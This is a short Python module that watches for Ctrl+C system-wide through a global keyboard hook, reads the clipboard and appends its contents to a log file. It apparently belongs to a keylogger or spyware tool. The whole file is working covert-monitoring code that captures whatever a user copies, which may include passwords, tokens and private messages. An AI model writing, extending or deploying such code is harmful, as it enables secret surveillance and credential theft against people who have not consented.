import pyperclip
from settings import path, logs_file

from pynput import keyboard


class Clipboard:
    """Monitoring clipboard contents"""

    def __init__(self):
        self.path = path
        self.logs = logs_file
        self.hotkey = keyboard.HotKey(keyboard.HotKey.parse('<ctrl>+c'),
                                      self.on_activate)

    def on_activate(self):
        self.copy_clipboard()

    def for_canonical(self, k):
        return lambda v: k(self.listener.canonical(v))

    def copy_clipboard(self):
        try:
            self.line = '\n[CTRL + C] -> ' + \
                pyperclip.paste() + ' <- [CTRL + C]\n'
        except Exception:
            pass

        self.write_cb(self.line)

    def write_cb(self, data):
        with open(self.path + self.logs, 'a') as f:
            f.write(data)

    def run(self):
        with keyboard.Listener(on_press=self.for_canonical(self.hotkey.press),
                               on_release=self.for_canonical(self.hotkey.release)) as self.listener:
            self.listener.join()
